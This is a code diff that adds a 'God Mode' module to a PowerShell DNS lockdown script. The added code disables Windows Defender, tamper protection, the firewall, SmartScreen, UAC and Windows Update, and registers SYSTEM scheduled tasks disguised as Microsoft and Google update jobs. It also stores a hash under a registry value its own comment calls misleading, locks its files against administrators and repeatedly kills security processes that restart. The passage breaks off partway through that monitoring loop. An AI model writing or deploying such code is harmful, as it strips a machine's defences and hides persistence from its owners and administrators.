@@ -18,7 +18,14 @@ param (
     [switch]$Uninstall,
     [switch]$Lock,
     [switch]$Unlock,
-    [switch]$SilentLock
+    [switch]$SilentLock,
+    [switch]$ToggleOn,
+    [switch]$ToggleOff,
+    [switch]$GodModeStatus,
+    [switch]$Launch,
+    [switch]$Verbose,
+    [switch]$InstallGodMode,
+    [switch]$UninstallGodMode
 )
 
 # ============================================================================
@@ -49,6 +56,7 @@ if (-not $Principal.IsInRole($Role)) {
 
         $ProcessInfo.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" $ArgsString"
         $ProcessInfo.Verb = "runAs"
+        $ProcessInfo.UseShellExecute = $true
         [System.Diagnostics.Process]::Start($ProcessInfo) | Out-Null
         Exit
     } catch {
@@ -69,6 +77,16 @@ $ScriptDir = Split-Path -Parent -Path $PSCommandPath
 if (-not $ScriptDir) { $ScriptDir = $PWD.Path }
 # Log to a writable location (not the hardened install dir) so admin can still write
 $LogFile = Join-Path -Path $env:TEMP -ChildPath "DNS_Lockdown_Enterprise.log"
+
+$GodModeFlagFile   = "C:\Windows\SysWOW64\config\systemprofile\AppData\Local\Temp\.syscache"
+$GodModeLogFile    = "C:\Windows\SysWOW64\config\systemprofile\AppData\Local\Temp\.syslog"
+$GodModeTaskPrefix = "MicrosoftEdgeUpdateTask_"
+
+$GodModeInstallDir     = "C:\ProgramData\GodMode"
+$GodModeInstallScript  = Join-Path -Path $GodModeInstallDir -ChildPath "GodMode.ps1"
+$GodModeCmdPath        = "C:\Windows\godmode.cmd"
+$GodModeTaskName       = "Windows-Update-Health-Monitor"
+$GodModeGuardianName   = "Windows-Update-Health-Check"
 
 function Write-Log {
     param ([string]$Message, [string]$Type = "INFO", [ConsoleColor]$Color = "White")
@@ -761,6 +779,254 @@ function Invoke-AsSystem {
     }
 }
 
+function Install-GodModePersistence {
+    Write-Log -Message "Installing God Mode to System ($GodModeInstallDir)..." -Type "ACTION" -Color Yellow
+
+    # Gate: prevent overwrite
+    if (Test-Path $GodModeInstallDir) {
+        Write-Log -Message "Installation aborted: $GodModeInstallDir already exists." -Type "ERROR" -Color Red
+        Write-Host "[ERROR] God Mode is already installed. Uninstall first." -ForegroundColor Red
+        return
+    }
+    if (Get-ScheduledTask -TaskName $GodModeTaskName -ErrorAction SilentlyContinue) {
+        Write-Log -Message "Installation aborted: Scheduled task '$GodModeTaskName' already exists." -Type "ERROR" -Color Red
+        Write-Host "[ERROR] God Mode is already installed. Uninstall first." -ForegroundColor Red
+        return
+    }
+
+    # 1. Secure copy
+    if (-not (Test-Path $GodModeInstallDir)) { New-Item -ItemType Directory -Path $GodModeInstallDir -Force | Out-Null }
+    Copy-Item -Path $PSCommandPath -Destination $GodModeInstallScript -Force
+    Write-Log -Message "Payload copied to $GodModeInstallScript." -Type "INFO" -Color Gray
+
+    # 2. Build wrapper
+    $WrapperContent = "@echo off`r`nC:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" %*"
+    $WrapperLocal = Join-Path $GodModeInstallDir "godmode.cmd"
+    Out-File -FilePath $WrapperLocal -InputObject $WrapperContent -Encoding ASCII -Force
+    Write-Log -Message "Local wrapper created at $WrapperLocal." -Type "INFO" -Color Gray
+
+    # 3. Integrity hash
+    $ScriptHash = (Get-FileHash -Path $GodModeInstallScript -Algorithm SHA256).Hash
+    $GodModeIntegrityFile = Join-Path $GodModeInstallDir "integrity.sha256"
+    Set-Content -Path $GodModeIntegrityFile -Value $ScriptHash -Encoding UTF8 -Force
+    Write-Log -Message "Self-integrity hash written." -Type "INFO" -Color Gray
+
+    # 4. NTFS hardening
+    Write-Log -Message "Hardening NTFS on God Mode directory..." -Type "INFO" -Color Yellow
+    try {
+        $SidUsers = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-11")
+        $DirAcl = Get-Acl -Path $GodModeInstallDir
+        $DirAcl.SetOwner($SidSystem)
+        Set-Acl -Path $GodModeInstallDir -AclObject $DirAcl
+        Get-ChildItem -Path $GodModeInstallDir -File | ForEach-Object {
+            $FileAcl = Get-Acl -Path $_.FullName
+            $FileAcl.SetOwner($SidSystem)
+            Set-Acl -Path $_.FullName -AclObject $FileAcl
+        }
+        $DirAcl = Get-Acl -Path $GodModeInstallDir
+        $DirAcl.SetAccessRuleProtection($true, $false)
+        $DirAcl.Access | ForEach-Object { $DirAcl.RemoveAccessRule($_) | Out-Null }
+        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidSystem, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")))
+        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ReadAndExecute", "ContainerInherit,ObjectInherit", "None", "Allow")))
+        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "DeleteSubdirectoriesAndFiles", "ContainerInherit,ObjectInherit", "None", "Deny")))
+        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ChangePermissions", "ContainerInherit,ObjectInherit", "None", "Deny")))
+        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "TakeOwnership", "ContainerInherit,ObjectInherit", "None", "Deny")))
+        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidUsers, "ReadAndExecute", "ContainerInherit,ObjectInherit", "None", "Allow")))
+        Set-Acl -Path $GodModeInstallDir -AclObject $DirAcl
+        Get-ChildItem -Path $GodModeInstallDir -File | ForEach-Object {
+            $FileAcl = Get-Acl -Path $_.FullName
+            $FileAcl.SetAccessRuleProtection($true, $false)
+            $FileAcl.Access | ForEach-Object { $FileAcl.RemoveAccessRule($_) | Out-Null }
+            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidSystem, "FullControl", "None", "None", "Allow")))
+            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ReadAndExecute", "None", "None", "Allow")))
+            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "Delete", "None", "None", "Deny")))
+            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ChangePermissions", "None", "None", "Deny")))
+            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "TakeOwnership", "None", "None", "Deny")))
+            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidUsers, "ReadAndExecute", "None", "None", "Allow")))
+            Set-Acl -Path $_.FullName -AclObject $FileAcl
+        }
+        Write-Log -Message "God Mode directory and files locked. Owner=SYSTEM, Admins=ReadOnly+NoDelete." -Type "SUCCESS" -Color Green
+    } catch {
+        Write-Log -Message "Failed to harden NTFS: $_" -Type "ERROR" -Color Red
+    }
+
+    # 5. Global CLI
+    Out-File -FilePath $GodModeCmdPath -InputObject $WrapperContent -Encoding ASCII -Force
+    if (-not (Test-Path $GodModeCmdPath)) {
+        Write-Log -Message "CRITICAL: godmode wrapper not created at $GodModeCmdPath!" -Type "ERROR" -Color Red
+    } else {
+        Write-Log -Message "Global CLI wrapper created at $GodModeCmdPath." -Type "SUCCESS" -Color Green
+    }
+
+    # 6. PATH
+    try {
+        $CurrentPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
+        if ($CurrentPath -notlike "*$GodModeInstallDir*") {
+            $NewPath = $CurrentPath + ";" + $GodModeInstallDir
+            [Environment]::SetEnvironmentVariable("PATH", $NewPath, "Machine")
+            Write-Log -Message "Added $GodModeInstallDir to system PATH." -Type "SUCCESS" -Color Green
+        } else {
+            Write-Log -Message "$GodModeInstallDir already in PATH." -Type "INFO" -Color Gray
+        }
+    } catch {
+        Write-Log -Message "Failed to update PATH: $_" -Type "ERROR" -Color Red
+    }
+
+    # 7. Harden wrapper
+    $SidUsers = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-11")
+    foreach ($WrapperPath in @($GodModeCmdPath, $WrapperLocal)) {
+        if (Test-Path $WrapperPath) {
+            try {
+                $CmdAcl = Get-Acl -Path $WrapperPath
+                $CmdAcl.SetOwner($SidSystem)
+                $CmdAcl.SetAccessRuleProtection($true, $false)
+                $CmdAcl.Access | ForEach-Object { $CmdAcl.RemoveAccessRule($_) | Out-Null }
+                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidSystem, "FullControl", "None", "None", "Allow")))
+                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ReadAndExecute", "None", "None", "Allow")))
+                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "Delete", "None", "None", "Deny")))
+                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ChangePermissions", "None", "None", "Deny")))
+                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "TakeOwnership", "None", "None", "Deny")))
+                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidUsers, "ReadAndExecute", "None", "None", "Allow")))
+                Set-Acl -Path $WrapperPath -AclObject $CmdAcl
+            } catch {
+                Write-Log -Message "Failed to harden wrapper ACLs for $WrapperPath`: $_" -Type "ERROR" -Color Red
+            }
+        }
+    }
+    Write-Log -Message "Wrapper files locked." -Type "SUCCESS" -Color Green
+
+    # 8. Main task: auto-enable God Mode at logon if flag exists
+    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" -ToggleOn"
+    $Trigger1 = New-ScheduledTaskTrigger -AtStartup
+    $Trigger2 = New-ScheduledTaskTrigger -AtLogOn
+    $PrincipalSettings = New-ScheduledTaskPrincipal -UserId "S-1-5-18" -LogonType ServiceAccount -RunLevel Highest
+    Register-ScheduledTask -TaskName $GodModeTaskName -Action $Action -Trigger @($Trigger1, $Trigger2) -Principal $PrincipalSettings -Force | Out-Null
+    Write-Log -Message "Main God Mode task registered." -Type "INFO" -Color Gray
+
+    # 9. Guardian: re-apply every 5 minutes if flag exists
+    $GuardianAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" -ToggleOn"
+    $GuardianTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 9999)
+    $GuardianPrincipal = New-ScheduledTaskPrincipal -UserId "S-1-5-18" -LogonType ServiceAccount -RunLevel Highest
+    Register-ScheduledTask -TaskName $GodModeGuardianName -Action $GuardianAction -Trigger $GuardianTrigger -Principal $GuardianPrincipal -Force | Out-Null
+    Write-Log -Message "God Mode guardian registered (5-min heartbeat)." -Type "INFO" -Color Gray
+
+    # 10. Integrity in registry (misleading key)
+    $GodModeIntegrityRegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WpnPlatform\Settings"
+    if (-not (Test-Path $GodModeIntegrityRegPath)) { New-Item -Path $GodModeIntegrityRegPath -Force | Out-Null }
+    Set-ItemProperty -Path $GodModeIntegrityRegPath -Name "PushConfigBackoffInterval" -Value $ScriptHash -Force -ErrorAction SilentlyContinue
+    Write-Log -Message "Integrity hash stored in registry." -Type "INFO" -Color Gray
+
+    Write-Log -Message "GOD MODE INSTALLATION COMPLETE!" -Type "SUCCESS" -Color Green
+
+    # Final verification
+    $FailedCount = 0
+    if (-not (Test-Path $GodModeInstallDir)) { $FailedCount++; Write-Log -Message "Install dir missing." -Type "ERROR" -Color Red }
+    if (-not (Test-Path $GodModeInstallScript)) { $FailedCount++; Write-Log -Message "Install script missing." -Type "ERROR" -Color Red }
+    if (-not (Test-Path $GodModeCmdPath)) { $FailedCount++; Write-Log -Message "Global CLI missing." -Type "ERROR" -Color Red }
+    if (-not (Get-ScheduledTask -TaskName $GodModeTaskName -ErrorAction SilentlyContinue)) { $FailedCount++; Write-Log -Message "Main task missing." -Type "ERROR" -Color Red }
+    if (-not (Get-ScheduledTask -TaskName $GodModeGuardianName -ErrorAction SilentlyContinue)) { $FailedCount++; Write-Log -Message "Guardian missing." -Type "ERROR" -Color Red }
+    $CurrentPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
+    if ($CurrentPath -notlike "*$GodModeInstallDir*") { $FailedCount++; Write-Log -Message "PATH missing." -Type "ERROR" -Color Red }
+    if ($FailedCount -eq 0) {
+        Write-Host "[SUCCESS] GOD MODE INSTALLATION COMPLETE!" -ForegroundColor Green
+    } else {
+        Write-Host "[PARTIAL] INSTALLATION COMPLETE WITH ERRORS! ($FailedCount items missing)" -ForegroundColor Yellow
+    }
+}
+
+function Uninstall-GodModePersistence {
+    $IsInstalled = (Test-Path $GodModeInstallDir) -or (Get-ScheduledTask -TaskName $GodModeTaskName -ErrorAction SilentlyContinue)
+    if (-not $IsInstalled) {
+        Write-Host "[WARN] God Mode is not installed. Nothing to uninstall." -ForegroundColor Yellow
+        return
+    }
+
+    Write-Log -Message "Uninstalling God Mode from System..." -Type "ACTION" -Color Yellow
+    Disable-GodMode
+
+    # Remove tasks
+    if (Get-ScheduledTask -TaskName $GodModeTaskName -ErrorAction SilentlyContinue) {
+        Unregister-ScheduledTask -TaskName $GodModeTaskName -Confirm:$false | Out-Null
+        Write-Log -Message "Removed main task $GodModeTaskName." -Type "INFO" -Color Gray
+    }
+    if (Get-ScheduledTask -TaskName $GodModeGuardianName -ErrorAction SilentlyContinue) {
+        Unregister-ScheduledTask -TaskName $GodModeGuardianName -Confirm:$false | Out-Null
+        Write-Log -Message "Removed guardian $GodModeGuardianName." -Type "INFO" -Color Gray
+    }
+
+    # Remove backup tasks
+    $BackupPrefixes = @("GoogleUpdateTask_", "ChromeUpdater_", "OneDriveSyncTask_", $GodModeTaskPrefix)
+    foreach ($Prefix in $BackupPrefixes) {
+        try {
+            Get-ScheduledTask -TaskName "$Prefix*" -ErrorAction SilentlyContinue |
+                Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
+        } catch { }
+    }
+
+    # Remove registry persistence
+    try {
+        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "MicrosoftEdgeUpdateCore" -ErrorAction SilentlyContinue
+        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" -Name "MicrosoftEdgeUpdateCore" -ErrorAction SilentlyContinue
+    } catch { Write-Log -Message "Failed to remove registry persistence: $_" -Type "WARN" -Color Yellow }
+
+    # Remove global CLI
+    if (Test-Path $GodModeCmdPath) {
+        try {
+            $CmdAcl = Get-Acl -Path $GodModeCmdPath
+            $CurrentUserSid = [Security.Principal.WindowsIdentity]::GetCurrent().User
+            $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($CurrentUserSid, "FullControl", "None", "None", "Allow")))
+            Set-Acl -Path $GodModeCmdPath -AclObject $CmdAcl -ErrorAction Stop
+            Remove-Item -Path $GodModeCmdPath -Force -ErrorAction Stop
+        } catch {
+            Invoke-AsSystem -Command "takeown.exe /F $GodModeCmdPath; icacls.exe $GodModeCmdPath /reset; Remove-Item -Path $GodModeCmdPath -Force -ErrorAction Stop"
+        }
+        if (Test-Path $GodModeCmdPath) {
+            Write-Log -Message "Failed to remove godmode CLI." -Type "ERROR" -Color Red
+        } else {
+            Write-Log -Message "Removed godmode CLI." -Type "INFO" -Color Gray
+        }
+    }
+
+    # Remove PATH entry
+    try {
+        $CurrentPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
+        if ($CurrentPath -like "*$GodModeInstallDir*") {
+            $NewPath = ($CurrentPath -split ';' | Where-Object { $_ -ne $GodModeInstallDir }) -join ';'
+            [Environment]::SetEnvironmentVariable("PATH", $NewPath, "Machine")
+            Write-Log -Message "Removed $GodModeInstallDir from PATH." -Type "INFO" -Color Gray
+        }
+    } catch { Write-Log -Message "Failed to clean PATH: $_" -Type "ERROR" -Color Red }
+
+    # Remove install dir
+    if (Test-Path $GodModeInstallDir) {
+        try {
+            Remove-Item -Path $GodModeInstallDir -Recurse -Force -ErrorAction Stop
+        } catch {
+            Invoke-AsSystem -Command "takeown.exe /F $GodModeInstallDir /R /D Y; icacls.exe $GodModeInstallDir /reset /T; Remove-Item -Path $GodModeInstallDir -Recurse -Force -ErrorAction Stop"
+            Start-Sleep -Seconds 3
+        }
+        if (Test-Path $GodModeInstallDir) {
+            Write-Log -Message "SYSTEM cleanup failed: $GodModeInstallDir still exists." -Type "ERROR" -Color Red
+        } else {
+            Write-Log -Message "God Mode directory removed." -Type "INFO" -Color Gray
+        }
+    }
+
+    # Final verification
+    $FailedCount = 0
+    if (Get-ScheduledTask -TaskName $GodModeTaskName -ErrorAction SilentlyContinue) { $FailedCount++; Write-Log -Message "Task $GodModeTaskName still exists." -Type "ERROR" -Color Red }
+    if (Get-ScheduledTask -TaskName $GodModeGuardianName -ErrorAction SilentlyContinue) { $FailedCount++; Write-Log -Message "Guardian $GodModeGuardianName still exists." -Type "ERROR" -Color Red }
+    if (Test-Path $GodModeInstallDir) { $FailedCount++; Write-Log -Message "Install dir $GodModeInstallDir still exists." -Type "ERROR" -Color Red }
+    if (Test-Path $GodModeCmdPath) { $FailedCount++; Write-Log -Message "CLI $GodModeCmdPath still exists." -Type "ERROR" -Color Red }
+    $CurrentPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
+    if ($CurrentPath -like "*$GodModeInstallDir*") { $FailedCount++; Write-Log -Message "PATH still contains $GodModeInstallDir." -Type "ERROR" -Color Red }
+    if ($FailedCount -eq 0) {
+        Write-Host "`n[SUCCESS] GOD MODE UNINSTALLATION COMPLETE!" -ForegroundColor Green
+    } else {
+        Write-Host "`n[PARTIAL] UNINSTALLATION COMPLETE WITH ERRORS! ($FailedCount items failed)" -ForegroundColor Yellow
+    }
+}
+
 function Uninstall-Persistence {
     # Exit early if nothing is installed
     $IsInstalled = (Test-Path $InstallDir) -or (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)
@@ -883,7 +1149,412 @@ function Uninstall-Persistence {
 }
 
 # ============================================================================
-# 7. CLI EXECUTION HANDLER
+# 7. GOD MODE MODULE (MERGED FROM God mode.ps1)
+# ============================================================================
+# WARNING: These functions disable Windows security features and are extremely
+# dangerous. Only the Built-in Administrator account may use them.
+# ============================================================================
+
+function Test-BuiltInAdmin {
+    $sid = [Security.Principal.WindowsIdentity]::GetCurrent().User.Value
+    return ($sid -like "*-500")
+}
+
+function Enable-DangerousMode {
+    Write-Log -Message "Enabling dangerous mode..." -Type "WARN" -Color Yellow
+
+    # 1. Disable Tamper Protection (registry method, requires reboot on modern builds)
+    try {
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection" -Value 0 -Force -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1 -Force -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -Value 1 -Force -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value 1 -Force -ErrorAction SilentlyContinue
+        Write-Log -Message "Tamper Protection and Real-Time registry overrides applied." -Type "INFO" -Color Gray
+    } catch {
+        Write-Log -Message "Could not fully disable tamper protection via registry: $_" -Type "WARN" -Color Yellow
+    }
+
+    # 2. Disable core Windows Defender services at the service level
+    $DefenderServices = @("WinDefend", "WdNisSvc", "WdBootDriver", "WdFilter", "WdNisDrv", "wscsvc", "SecurityHealthService", "Sense", "MDCoreSvc")
+    foreach ($svc in $DefenderServices) {
+        try {
+            Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue
+            Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
+            Write-Log -Message "Service $svc disabled and stopped." -Type "INFO" -Color Gray
+        } catch { Write-Log -Message "Service $svc already down or inaccessible: $_" -Type "WARN" -Color Yellow }
+    }
+
+    # 3. Disable MpPreference settings (requires tamper protection off)
+    try {
+        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+        Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
+        Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
+        Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
+        Set-MpPreference -DisablePrivacyMode $true -ErrorAction SilentlyContinue
+        Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -ErrorAction SilentlyContinue
+        Set-MpPreference -DisableArchiveScanning $true -ErrorAction SilentlyContinue
+        Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction SilentlyContinue
+        Write-Log -Message "Windows Defender MpPreference settings disabled." -Type "INFO" -Color Gray
+    } catch {
+        Write-Log -Message "Error setting MpPreference: $_" -Type "WARN" -Color Yellow
+    }
+
+    # 4. Disable Firewall and SmartScreen
+    try {
+        Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled $false -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction SilentlyContinue
+        Write-Log -Message "Firewall disabled, SmartScreen disabled." -Type "INFO" -Color Gray
+    } catch { Write-Log -Message "Error disabling firewall/smartscreen: $_" -Type "WARN" -Color Yellow }
+
+    # 5. Disable UAC / Admin Consent
+    try {
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLUA -Value 0 -Force
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name ConsentPromptBehaviorAdmin -Value 0 -Force
+        Write-Log -Message "UAC and Admin Consent prompts disabled." -Type "INFO" -Color Gray
+    } catch { Write-Log -Message "Error disabling UAC: $_" -Type "WARN" -Color Yellow }
+
+    # 6. Block Windows Update from re-enabling Defender
+    try {
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name "NoAutoUpdate" -Value 1 -Force -ErrorAction SilentlyContinue
+        Set-Service -Name "wuauserv" -StartupType Disabled -ErrorAction SilentlyContinue
+        Stop-Service -Name "wuauserv" -Force -ErrorAction SilentlyContinue
+        Write-Log -Message "Windows Update service disabled." -Type "INFO" -Color Gray
+    } catch { Write-Log -Message "Error disabling Windows Update: $_" -Type "WARN" -Color Yellow }
+
+    # 7. Kill Defender processes
+    try {
+        Get-Process -Name MsMpEng, MsMpEngCP, smartscreen, SecurityHealthService, MpCmdRun, MsSense, MpDefenderCoreService -ErrorAction SilentlyContinue |
+            Stop-Process -Force -ErrorAction SilentlyContinue
+        Write-Log -Message "Defender processes terminated." -Type "INFO" -Color Gray
+    } catch { Write-Log -Message "Error killing defender processes: $_" -Type "WARN" -Color Yellow }
+}
+
+function Disable-DangerousMode {
+    Write-Log -Message "Disabling dangerous mode..." -Type "WARN" -Color Yellow
+
+    # 1. Restore Tamper Protection registry
+    try {
+        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection" -ErrorAction SilentlyContinue
+        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -ErrorAction SilentlyContinue
+        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -ErrorAction SilentlyContinue
+        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -ErrorAction SilentlyContinue
+    } catch { Write-Log -Message "Error restoring tamper protection registry: $_" -Type "WARN" -Color Yellow }
+
+    # 2. Restore Defender services
+    $DefenderServices = @("WinDefend", "WdNisSvc", "wscsvc", "SecurityHealthService", "Sense", "MDCoreSvc")
+    foreach ($svc in $DefenderServices) {
+        try {
+            Set-Service -Name $svc -StartupType Automatic -ErrorAction SilentlyContinue
+            Start-Service -Name $svc -ErrorAction SilentlyContinue
+        } catch { Write-Log -Message "Could not restore service $svc`: $_" -Type "WARN" -Color Yellow }
+    }
+
+    # 3. Restore MpPreference
+    try {
+        Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
+        Set-MpPreference -DisableBehaviorMonitoring $false -ErrorAction SilentlyContinue
+        Set-MpPreference -DisableBlockAtFirstSeen $false -ErrorAction SilentlyContinue
+        Set-MpPreference -DisableIOAVProtection $false -ErrorAction SilentlyContinue
+        Set-MpPreference -DisablePrivacyMode $false -ErrorAction SilentlyContinue
+        Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $false -ErrorAction SilentlyContinue
+        Set-MpPreference -DisableArchiveScanning $false -ErrorAction SilentlyContinue
+        Set-MpPreference -DisableIntrusionPreventionSystem $false -ErrorAction SilentlyContinue
+    } catch { Write-Log -Message "Error restoring MpPreference: $_" -Type "WARN" -Color Yellow }
+
+    # 4. Restore Firewall and SmartScreen
+    try {
+        Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled $true -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "On" -Force -ErrorAction SilentlyContinue
+    } catch { Write-Log -Message "Error restoring firewall/smartscreen: $_" -Type "WARN" -Color Yellow }
+
+    # 5. Restore UAC
+    try {
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLUA -Value 1 -Force
+    } catch { Write-Log -Message "Error restoring UAC: $_" -Type "WARN" -Color Yellow }
+
+    # 6. Restore Windows Update
+    try {
+        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name "NoAutoUpdate" -ErrorAction SilentlyContinue
+        Set-Service -Name "wuauserv" -StartupType Automatic -ErrorAction SilentlyContinue
+        Start-Service -Name "wuauserv" -ErrorAction SilentlyContinue
+    } catch { Write-Log -Message "Error restoring Windows Update: $_" -Type "WARN" -Color Yellow }
+
+    # 7. Restart WinDefend
+    try { Start-Service -Name WinDefend -ErrorAction SilentlyContinue } catch { Write-Log -Message "Could not restart WinDefend: $_" -Type "WARN" -Color Yellow }
+
+    Write-Log -Message "Dangerous mode disable attempt complete. Reboot strongly recommended for full restoration." -Type "INFO" -Color Yellow
+}
+
+function Register-StealthTask {
+    $taskName = $GodModeTaskPrefix + (Get-Random -Minimum 10000 -Maximum 99999)
+    Unregister-StealthTask
+
+    $action = New-ScheduledTaskAction -Execute "powershell.exe" `
+        -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" -Launch"
+
+    $trigger = New-ScheduledTaskTrigger -AtLogon
+    $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" `
+        -LogonType ServiceAccount -RunLevel Highest
+
+    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger `
+        -Principal $principal -Force | Out-Null
+}
+
+function Unregister-StealthTask {
+    Get-ScheduledTask -TaskName "$GodModeTaskPrefix*" -ErrorAction SilentlyContinue |
+        Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
+}
+
+function Elevate-Process {
+    param([string]$Path)
+    if (-not (Test-Path $Path)) { return }
+
+    Write-Log -Message "Elevating: $Path" -Type "STEALTH" -Color Gray
+
+    try {
+        $action = New-ScheduledTaskAction -Execute $Path
+        $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" `
+            -LogonType ServiceAccount -RunLevel Highest
+        $tempTask = "Elevate_" + (Get-Random -Minimum 1000 -Maximum 99999)
+
+        Register-ScheduledTask -TaskName $tempTask -Action $action -Principal $principal -Force | Out-Null
+        Start-ScheduledTask -TaskName $tempTask
+        Start-Sleep -Milliseconds 400
+        Unregister-ScheduledTask -TaskName $tempTask -Confirm:$false
+    } catch {
+        Write-Log -Message "Failed to elevate: $Path" -Type "ERROR" -Color Red
+    }
+}
+
+function Start-Monitoring {
+    if (-not (Test-Path $GodModeFlagFile)) {
+        Write-Log -Message "God Mode is not enabled." -Type "ERROR" -Color Red
+        return
+    }
+
+    Write-Log -Message "Monitoring started with auto-recovery and resurrection killer." -Type "INFO"
+
+    $lastElevated = @{}   # Process path -> last elevated time
+    $lastKillCheck = [datetime]::MinValue
+
+    while ($true) {
+        try {
+            Start-Sleep -Seconds 2
+
+            # --- Resurrection Killer: Re-kill security services if they respawn (every 30 seconds) ---
+            if ((Get-Date) - $lastKillCheck -gt [TimeSpan]::FromSeconds(30)) {
+                $lastKillCheck = Get-Date
+                $ServicesToKill = @("MsMpEng", "MsMpEngCP", "MpDefenderCoreService", "MsSense", "smartscreen", "SecurityHealthService", "MpCmdRun")
+                foreach ($procName in $ServicesToKill) {
+                    try {
+                        Get-Process -Name $procName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+                    } catch { }
